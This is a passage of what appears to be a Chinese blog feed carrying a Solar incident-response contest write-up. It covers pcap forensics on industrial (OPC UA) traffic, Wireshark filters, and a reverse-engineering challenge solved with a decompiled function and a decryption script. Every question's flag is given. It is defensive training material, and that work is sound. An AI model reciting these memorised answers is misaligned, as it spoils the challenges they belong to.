re<br><span class="hljs-keyword">import</span> csv<br><span class="hljs-keyword">from</span> datetime <span class="hljs-keyword">import</span> datetime<br><span class="hljs-keyword">from</span> scapy.<span class="hljs-built_in">all</span> <span class="hljs-keyword">import</span> rdpcap, Raw, IP, TCP, UDP<br><br><span class="hljs-comment"># 常见文本 NodeId 正则（ns=2;s=..., ns=1;i=123, ns=3;g=..., ns=0;b=...）</span><br>RE_NODEID_TEXT = re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">rb&#x27;ns=\d+;(?:s=[^\s,;\&quot;\&#x27;]+|i=\d+|g=[0-9A-Fa-f\-]+|b=[A-Za-z0-9+/=]+)&#x27;</span>)<br><span class="hljs-comment"># 对应的 unicode (UTF-16LE) 形式（查找 &quot;n\0s\0=\0digit\0&quot; 之类）</span><br>RE_NODEID_UTF16 = re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">rb&#x27;(?:n\0s\0=\0\d\0+\0;\0(?:s\0=\0[^\0,;\&quot;\&#x27;]+\0|i\0=\0\d\0+|g\0=\0[0-9A-Fa-f\-\0]+|b\0=\0[A-Za-z0-9+/=\0]+))&#x27;</span>, re.IGNORECASE)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">bytes_to_printable</span>(<span class="hljs-params">b</span>):<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">return</span> b.decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>, errors=<span class="hljs-string">&#x27;ignore&#x27;</span>)<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">str</span>(b)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">find_matches_in_payload</span>(<span class="hljs-params">payload_bytes</span>):<br>    matches = []<br>    <span class="hljs-comment"># 文本模式</span><br>    <span class="hljs-keyword">for</span> m <span class="hljs-keyword">in</span> RE_NODEID_TEXT.finditer(payload_bytes):<br>        <span class="hljs-keyword">try</span>:<br>            matches.append(m.group(<span class="hljs-number">0</span>).decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>, errors=<span class="hljs-string">&#x27;ignore&#x27;</span>))<br>        <span class="hljs-keyword">except</span>:<br>            matches.append(<span class="hljs-built_in">str</span>(m.group(<span class="hljs-number">0</span>)))<br>    <span class="hljs-comment"># UTF-16LE 模式 -&gt; 解码为正常字符串再把 \x00 去掉</span><br>    <span class="hljs-keyword">for</span> m <span class="hljs-keyword">in</span> RE_NODEID_UTF16.finditer(payload_bytes):<br>        <span class="hljs-keyword">try</span>:<br>            s = m.group(<span class="hljs-number">0</span>).decode(<span class="hljs-string">&#x27;utf-16le&#x27;</span>, errors=<span class="hljs-string">&#x27;ignore&#x27;</span>)<br>            matches.append(s)<br>        <span class="hljs-keyword">except</span>:<br>            <span class="hljs-comment"># 退回：移除 nulls</span><br>            cleaned = m.group(<span class="hljs-number">0</span>).replace(<span class="hljs-string">b&#x27;\x00&#x27;</span>, <span class="hljs-string">b&#x27;&#x27;</span>).decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>, errors=<span class="hljs-string">&#x27;ignore&#x27;</span>)<br>            matches.append(cleaned)<br>    <span class="hljs-comment"># 去重但保持顺序</span><br>    seen = <span class="hljs-built_in">set</span>()<br>    uniq = []<br>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> matches:<br>        <span class="hljs-keyword">if</span> x <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> seen:<br>            seen.add(x)<br>            uniq.append(x)<br>    <span class="hljs-keyword">return</span> uniq<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">scan_pcap</span>(<span class="hljs-params">path</span>):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[+] 读取 pcap：<span class="hljs-subst">&#123;path&#125;</span>&quot;</span>)<br>    pkts = rdpcap(path)<br>    results = []<br>    <span class="hljs-keyword">for</span> idx, p <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(pkts, start=<span class="hljs-number">1</span>):<br>        payload = <span class="hljs-string">b&#x27;&#x27;</span><br>        ts = <span class="hljs-literal">None</span><br>        src = dst = <span class="hljs-string">&quot;&quot;</span><br>        <span class="hljs-comment"># 尝试提取 Raw 层</span><br>        <span class="hljs-keyword">if</span> Raw <span class="hljs-keyword">in</span> p:<br>            payload = <span class="hljs-built_in">bytes</span>(p[Raw].load)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-comment"># 有些包可通过 TCP/UDP 层 payload 属性拿到</span><br>            <span class="hljs-keyword">if</span> TCP <span class="hljs-keyword">in</span> p <span class="hljs-keyword">and</span> <span class="hljs-built_in">hasattr</span>(p[TCP], <span class="hljs-string">&#x27;payload&#x27;</span>) <span class="hljs-keyword">and</span> <span class="hljs-built_in">len</span>(<span class="hljs-built_in">bytes</span>(p[TCP].payload))&gt;<span class="hljs-number">0</span>:<br>                payload = <span class="hljs-built_in">bytes</span>(p[TCP].payload)<br>            <span class="hljs-keyword">elif</span> UDP <span class="hljs-keyword">in</span> p <span class="hljs-keyword">and</span> <span class="hljs-built_in">hasattr</span>(p[UDP], <span class="hljs-string">&#x27;payload&#x27;</span>) <span class="hljs-keyword">and</span> <span class="hljs-built_in">len</span>(<span class="hljs-built_in">bytes</span>(p[UDP].payload))&gt;<span class="hljs-number">0</span>:<br>                payload = <span class="hljs-built_in">bytes</span>(p[UDP].payload)<br><br>        <span class="hljs-comment"># 时间戳（scapy Packet 有 time 属性）</span><br>        ts = <span class="hljs-built_in">getattr</span>(p, <span class="hljs-string">&#x27;time&#x27;</span>, <span class="hljs-literal">None</span>)<br>        <span class="hljs-keyword">if</span> ts:<br>            timestr = datetime.utcfromtimestamp(ts).strftime(<span class="hljs-string">&#x27;%Y-%m-%dT%H:%M:%SZ&#x27;</span>)<br>        <span class="hljs-keyword">else</span>:<br>            timestr = <span class="hljs-string">&quot;&quot;</span><br><br>        <span class="hljs-comment"># 源/目的</span><br>        <span class="hljs-keyword">if</span> IP <span class="hljs-keyword">in</span> p:<br>            src = p[IP].src<br>            dst = p[IP].dst<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-comment"># 非 IP 层可尝试层次结构的 src/dst 字段（或保持为空）</span><br>            src = <span class="hljs-built_in">getattr</span>(p, <span class="hljs-string">&#x27;src&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)<br>            dst = <span class="hljs-built_in">getattr</span>(p, <span class="hljs-string">&#x27;dst&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)<br><br>        <span class="hljs-keyword">if</span> payload <span class="hljs-keyword">and</span> <span class="hljs-built_in">len</span>(payload) &gt; <span class="hljs-number">0</span>:<br>            matches = find_matches_in_payload(payload)<br>            <span class="hljs-keyword">if</span> matches:<br>                <span class="hljs-keyword">for</span> m <span class="hljs-keyword">in</span> matches:<br>                    results.append(&#123;<br>                        <span class="hljs-string">&#x27;pkt_index&#x27;</span>: idx,<br>                        <span class="hljs-string">&#x27;time&#x27;</span>: timestr,<br>                        <span class="hljs-string">&#x27;src&#x27;</span>: src,<br>                        <span class="hljs-string">&#x27;dst&#x27;</span>: dst,<br>                        <span class="hljs-string">&#x27;nodeid&#x27;</span>: m,<br>                    &#125;)<br>    <span class="hljs-keyword">return</span> results<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">print_results</span>(<span class="hljs-params">results</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> results:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[!] 未发现匹配的 NodeId（文本或 UTF-16LE）。若流量加密则需要解密后再分析。&quot;</span>)<br>        <span class="hljs-keyword">return</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[+] 共发现 <span class="hljs-subst">&#123;<span class="hljs-built_in">len</span>(results)&#125;</span> 条匹配：&quot;</span>)<br>    <span class="hljs-keyword">for</span> r <span class="hljs-keyword">in</span> results:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;#<span class="hljs-subst">&#123;r[<span class="hljs-string">&#x27;pkt_index&#x27;</span>]:6d&#125;</span>  <span class="hljs-subst">&#123;r[<span class="hljs-string">&#x27;time&#x27;</span>]&#125;</span>  <span class="hljs-subst">&#123;r[<span class="hljs-string">&#x27;src&#x27;</span>]&#125;</span> -&gt; <span class="hljs-subst">&#123;r[<span class="hljs-string">&#x27;dst&#x27;</span>]&#125;</span>   <span class="hljs-subst">&#123;r[<span class="hljs-string">&#x27;nodeid&#x27;</span>]&#125;</span>&quot;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">save_csv</span>(<span class="hljs-params">results, outpath</span>):<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(outpath, <span class="hljs-string">&#x27;w&#x27;</span>, newline=<span class="hljs-string">&#x27;&#x27;</span>, encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>        writer = csv.DictWriter(f, fieldnames=[<span class="hljs-string">&#x27;pkt_index&#x27;</span>,<span class="hljs-string">&#x27;time&#x27;</span>,<span class="hljs-string">&#x27;src&#x27;</span>,<span class="hljs-string">&#x27;dst&#x27;</span>,<span class="hljs-string">&#x27;nodeid&#x27;</span>])<br>        writer.writeheader()<br>        <span class="hljs-keyword">for</span> r <span class="hljs-keyword">in</span> results:<br>            writer.writerow(r)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[+] 已保存 CSV: <span class="hljs-subst">&#123;outpath&#125;</span>&quot;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv) &lt; <span class="hljs-number">2</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Usage: python find_nodeid_in_pcap.py traffic.pcap [-o out.csv]&quot;</span>)<br>        sys.exit(<span class="hljs-number">1</span>)<br>    pcap = sys.argv[<span class="hljs-number">1</span>]<br>    out = <span class="hljs-literal">None</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv) &gt;= <span class="hljs-number">3</span> <span class="hljs-keyword">and</span> sys.argv[<span class="hljs-number">2</span>] <span class="hljs-keyword">in</span> (<span class="hljs-string">&#x27;-o&#x27;</span>,<span class="hljs-string">&#x27;--out&#x27;</span>) <span class="hljs-keyword">and</span> <span class="hljs-built_in">len</span>(sys.argv) &gt;=<span class="hljs-number">4</span>:<br>        out = sys.argv[<span class="hljs-number">3</span>]<br>    res = scan_pcap(pcap)<br>    print_results(res)<br>    <span class="hljs-keyword">if</span> out:<br>        save_csv(res, out)<br><br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/53eee1be9c176179.png"></p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">flag&#123;ns<span class="hljs-operator">=</span><span class="hljs-number">2</span><span class="hljs-comment">;s=Pump/SpeedSetpoint&#125;</span><br></code></pre></td></tr></table></figure><h2 id="Q3"><a href="#Q3" class="headerlink" title="Q3"></a>Q3</h2><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus">工程站域名解析结果<br>找出工程站域名 engws<span class="hljs-selector-class">.plant</span><span class="hljs-selector-class">.local</span> 的 A 记录解析结果（目标 IP）。<br></code></pre></td></tr></table></figure><p>过滤搜索</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">dns &amp;&amp; (dns<span class="hljs-selector-class">.qry</span><span class="hljs-selector-class">.name</span> == <span class="hljs-string">&quot;engws.plant.local&quot;</span>)<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/8c11a5269119715f.png"></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag</span>&#123;<span class="hljs-number">10.0.0.8</span>&#125;<br></code></pre></td></tr></table></figure><h2 id="Q4"><a href="#Q4" class="headerlink" title="Q4"></a>Q4</h2><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ruby">确定 <span class="hljs-variable constant_">HMI</span>（源：<span class="hljs-number">10.0</span>.<span class="hljs-number">0</span>.x）到工程站（目的：<span class="hljs-number">10.0</span>.<span class="hljs-number">0</span>.x）上首个成功发起的时间点。<br>提交格式：flag&#123;<span class="hljs-variable constant_">YYYY</span>-<span class="hljs-variable constant_">MM</span>-<span class="hljs-variable constant_">DDTHH</span><span class="hljs-symbol">:MM</span><span class="hljs-symbol">:SSZ</span>&#125;（<span class="hljs-variable constant_">UTC</span>，精确到秒）<br></code></pre></td></tr></table></figure><p>过滤</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ip</span>.src == <span class="hljs-number">10.0.0.5</span> &amp;&amp; ip.dst == <span class="hljs-number">10.0.0.8</span> &amp;&amp;tcp<br></code></pre></td></tr></table></figure><p>握手成功时间</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag</span>&#123;<span class="hljs-number">2025</span>-<span class="hljs-number">03</span>-<span class="hljs-number">12</span>T14:<span class="hljs-number">22</span>:<span class="hljs-number">09</span>Z&#125;<br></code></pre></td></tr></table></figure><h2 id="Q5"><a href="#Q5" class="headerlink" title="Q5"></a>Q5</h2><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">在横向后不久，HMI 对工程站发起了 HTTP 请求。提交请求的 Host 与 URI，用下划线连接。<br></code></pre></td></tr></table></figure><p>过滤搜索</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">ip.dst</span> == <span class="hljs-number">10.0</span>.<span class="hljs-number">0.8</span> &amp;&amp; http.request<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/0a4f026c6b49e61a.png"></p><p>拼接</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">flag&#123;engws.plant.local_/rpc&#125;<br></code></pre></td></tr></table></figure><h1 id="逆向"><a href="#逆向" class="headerlink" title="逆向"></a>逆向</h1><h2 id="Brainiac"><a href="#Brainiac" class="headerlink" title="Brainiac"></a>Brainiac</h2><p>有异常处理，进行动态调试，在 Handler 里下断点，触发异常时会把 <code>RIP</code> 设置为 <code>ModuleHandleA + 2</code></p><p><img src="https://img.dkdun.cn/v1/2025/12/5bfcce3a4571801a.png"></p><p>在 process option 里填写</p><p><img src="https://img.dkdun.cn/v1/2025/12/a07635952d9fd836.png"></p><p>调试跟进，出现 MZ 字样时按 P 创建函数，出现如下函数</p><p><img src="https://img.dkdun.cn/v1/2025/12/2f32abb2fb3ba939.png"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs c">__int64 __fastcall <span class="hljs-title function_">sub_7FF7D1540002</span><span class="hljs-params">(__int64 a1)</span><br>&#123;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v2; <span class="hljs-comment">// r9d</span><br>  <span class="hljs-type">unsigned</span> __int64 v3; <span class="hljs-comment">// rax</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v4; <span class="hljs-comment">// r11d</span><br>  <span class="hljs-type">int</span> v5; <span class="hljs-comment">// r10d</span><br>  __int64 v6; <span class="hljs-comment">// r8</span><br>  <span class="hljs-type">int</span> *v7; <span class="hljs-comment">// r8</span><br>  <span class="hljs-type">int</span> v8; <span class="hljs-comment">// edx</span><br>  __int64 v9; <span class="hljs-comment">// rax</span><br>  __int64 v11; <span class="hljs-comment">// [rsp+20h] [rbp+8h] BYREF</span><br>  __int64 v12; <span class="hljs-comment">// [rsp+28h] [rbp+10h] BYREF</span><br><br>  v2 = *(_DWORD *)(a1 + <span class="hljs-number">16</span>);<br>  <span class="hljs-keyword">if</span> ( (v2 &amp; <span class="hljs-number">7</span>) != <span class="hljs-number">0</span> )<br>    v2 = (v2 &amp; <span class="hljs-number">0xFFFFFFF8</span>) + <span class="hljs-number">8</span>;<br>  v3 = __rdtsc();<br>  v4 = <span class="hljs-number">0</span>;<br>  v5 = v3 ^ HIDWORD(v3) ^ <span class="hljs-number">0x76543210</span>;<br>  *(_DWORD *)(v2 + *(_QWORD *)(a1 + <span class="hljs-number">8</span>)) = v5;<br>  *(_DWORD *)(*(_QWORD *)(a1 + <span class="hljs-number">8</span>) + v2 + <span class="hljs-number">4</span>i64) = *(_DWORD *)(a1 + <span class="hljs-number">16</span>) ^ v5 ^ <span class="hljs-number">0x89ABCDEF</span>;<br>  *(_DWORD *)(*(_QWORD *)(a1 + <span class="hljs-number">8</span>) + v2 + <span class="hljs-number">8</span>i64) = <span class="hljs-number">1330403418</span>;<br>  <span class="hljs-keyword">for</span> ( *(_DWORD *)(*(_QWORD *)(a1 + <span class="hljs-number">8</span>) + v2 + <span class="hljs-number">12</span>i64) = <span class="hljs-number">1380272963</span>; v4 &lt; v2; v7[<span class="hljs-number">1</span>] = v5 ^ v8 )<br>  &#123;<br>    v6 = v4;<br>    v4 += <span class="hljs-number">8</span>;<br>    v7 = (<span class="hljs-type">int</span> *)(*(_QWORD *)(a1 + <span class="hljs-number">8</span>) + v6);<br>    v8 = *v7;<br>    *v7 = v7[<span class="hljs-number">1</span>] ^ (<span class="hljs-number">1919810</span> - <span class="hljs-number">86066498</span> * v5);<br>    v5 = <span class="hljs-number">1919810</span> - <span class="hljs-number">86066498</span> * (<span class="hljs-number">1919810</span> - <span class="hljs-number">86066498</span> * v5);<br>  &#125;<br>  v9 = *(_QWORD *)a1 + <span class="hljs-number">4217</span>i64;<br>  v11 = <span class="hljs-number">8</span>i64;<br>  v12 = v9;<br>  (*(<span class="hljs-type">void</span> (__fastcall **)(__int64, __int64 *, __int64 *, __int64, __int64))(a1 + <span class="hljs-number">24</span>))(<span class="hljs-number">-1</span>i64, &amp;v12, &amp;v11, <span class="hljs-number">4</span>i64, a1 + <span class="hljs-number">20</span>);<br>  *(_QWORD *)(*(_QWORD *)a1 + <span class="hljs-number">4217</span>i64) = <span class="hljs-number">0</span>i64;<br>  (*(<span class="hljs-type">void</span> (__fastcall **)(__int64, __int64 *, __int64 *, _QWORD, __int64))(a1 + <span class="hljs-number">24</span>))(<br>    <span class="hljs-number">-1</span>i64,<br>    &amp;v12,<br>    &amp;v11,<br>    *(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> *)(a1 + <span class="hljs-number">20</span>),<br>    a1 + <span class="hljs-number">20</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>i64;<br>&#125;<br></code></pre></td></tr></table></figure><p>脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> struct<br><br>ciphertext = <span class="hljs-built_in">bytes</span>.fromhex(<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">EF 1C FD 7A 7C 33 44 12 EB A0 21 A5 C0 68 74 03</span><br><span class="hljs-string">02 DA B0 DA B3 25 56 99 73 BE 39 05 A2 97 29 F2</span><br><span class="hljs-string">D8 63 35 4E F7 A1 11 E6 E5 6F A9 DA F9 4E B7 B3</span><br><span class="hljs-string">A7 C2 42 EC A4 62 DA 92 77 E4 37 C2 AF 29 9C 4B</span><br><span class="hljs-string">5A 58 4C 4F 43 4B 45 52</span><br><span class="hljs-string">&quot;&quot;&quot;</span>.replace(<span class="hljs-string">&#x27;\n&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>))<br><br><br>encrypted_data = <span class="hljs-built_in">bytearray</span>(ciphertext[:<span class="hljs-number">56</span>])<br>metadata = ciphertext[<span class="hljs-number">56</span>:]<br><br>v5_stored = struct.unpack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, metadata[<span class="hljs-number">0</span>:<span class="hljs-number">4</span>])[<span class="hljs-number">0</span>]<br>size_xor = struct.unpack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, metadata[<span class="hljs-number">4</span>:<span class="hljs-number">8</span>])[<span class="hljs-number">0</span>]<br>original_size = size_xor ^ v5_stored ^ <span class="hljs-number">0x89ABCDEF</span><br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;密文长度: <span class="hljs-subst">&#123;<span class="hljs-built_in">len</span>(ciphertext)&#125;</span> 字节&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;种子 v5: 0x<span class="hljs-subst">&#123;v5_stored:08X&#125;</span>&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;原始大小: <span class="hljs-subst">&#123;original_size&#125;</span> 字节\n&quot;</span>)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypt_combined</span>(<span class="hljs-params">data, seed, original_size</span>):<br><br>    result = <span class="hljs-built_in">bytearray</span>()<br>    v5_before = seed<br>    v5_after = seed<br>    <br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(data), <span class="hljs-number">8</span>):<br>        <span class="hljs-keyword">if</span> i + <span class="hljs-number">7</span> &lt; <span class="hljs-built_in">len</span>(data):<br>            enc0 = struct.unpack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, data[i:i + <span class="hljs-number">4</span>])[<span class="hljs-number">0</span>]<br>            enc1 = struct.unpack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, data[i + <span class="hljs-number">4</span>:i + <span class="hljs-number">8</span>])[<span class="hljs-number">0</span>]<br>            <br>            <span class="hljs-comment"># 策略1：v5先更新（用于解密前4字节）</span><br>            v5_before = (<span class="hljs-number">1919810</span> - <span class="hljs-number">86066498</span> * v5_before) &amp; <span class="hljs-number">0xFFFFFFFF</span><br>            v5_before = (<span class="hljs-number">1919810</span> - <span class="hljs-number">86066498</span> * v5_before) &amp; <span class="hljs-number">0xFFFFFFFF</span><br>            key_before = (<span class="hljs-number">1919810</span> - <span class="hljs-number">86066498</span> * v5_before) &amp; <span class="hljs-number">0xFFFFFFFF</span><br>            part1 = enc1 ^ v5_before  <span class="hljs-comment"># 前4字节</span><br>            <br>            <span class="hljs-comment"># 策略2：v5后更新（用于解密后4字节）</span><br>            key_after = (<span class="hljs-number">1919810</span> - <span class="hljs-number">86066498</span> * v5_after) &amp; <span class="hljs-number">0xFFFFFFFF</span><br>            part2 = enc0 ^ key_after  <span class="hljs-comment"># 后4字节</span><br>            v5_after = (<span class="hljs-number">1919810</span> - <span class="hljs-number">86066498</span> * v5_after) &amp; <span class="hljs-number">0xFFFFFFFF</span><br>            v5_after = (<span class="hljs-number">1919810</span> - <span class="hljs-number">86066498</span> * v5_after) &amp; <span class="hljs-number">0xFFFFFFFF</span><br>            <br>            <span class="hljs-comment"># 合并：前4字节 + 后4字节</span><br>            result.extend(struct.pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, part1))<br>            result.extend(struct.pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, part2))<br>    <br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">bytes</span>(result[:original_size])<br><br><br>flag = decrypt_combined(encrypted_data, v5_stored, original_size)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;=&quot;</span>*<span class="hljs-number">60</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;完整FLAG解密结果:&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Hex: <span class="hljs-subst">&#123;<span class="hljs-string">&#x27; &#x27;</span>.join(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;b:02X&#125;</span>&#x27;</span> <span class="hljs-keyword">for</span> b <span class="hljs-keyword">in</span> flag)&#125;</span>&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;ASCII: <span class="hljs-subst">&#123;flag.decode(<span class="hljs-string">&#x27;ascii&#x27;</span>, errors=<span class="hljs-string">&#x27;replace&#x27;</span>)&#125;</span>&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;=&quot;</span>*<span class="hljs-number">60</span>)<br><br><span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;flag&#123;&#x27;</span> <span class="hljs-keyword">in</span> flag <span class="hljs-keyword">and</span> <span class="hljs-string">b&#x27;&#125;&#x27;</span> <span class="hljs-keyword">in</span> flag:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;\n✓✓✓ 成功解密！ ✓✓✓&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;\nFLAG: <span class="hljs-subst">&#123;flag.decode(<span class="hljs-string">&#x27;ascii&#x27;</span>)&#125;</span>&quot;</span>)<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\n⚠ 解密可能有误&quot;</span>)<br></code></pre></td></tr></table></figure><p>拿到结果</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">flag&#123;<span class="hljs-symbol">M4lf0Rmed_Pe_W1th_B4d_ReL0Ca71oNs@</span>solarsec_202510&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>应急响应&amp;取证</category>
      
    </categories>
    
    
    <tags>
      
      <tag>应急响应</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2025年Solar应急响应公益月赛-9月</title>
    <link href="/2025/10/10/2025%E5%B9%B4Solar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%85%AC%E7%9B%8A%E6%9C%88%E8%B5%9B-9%E6%9C%88/"/>
    <url>/2025/10/10/2025%E5%B9%B4Solar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%85%AC%E7%9B%8A%E6%9C%88%E8%B5%9B-9%E6%9C%88/</url>
    
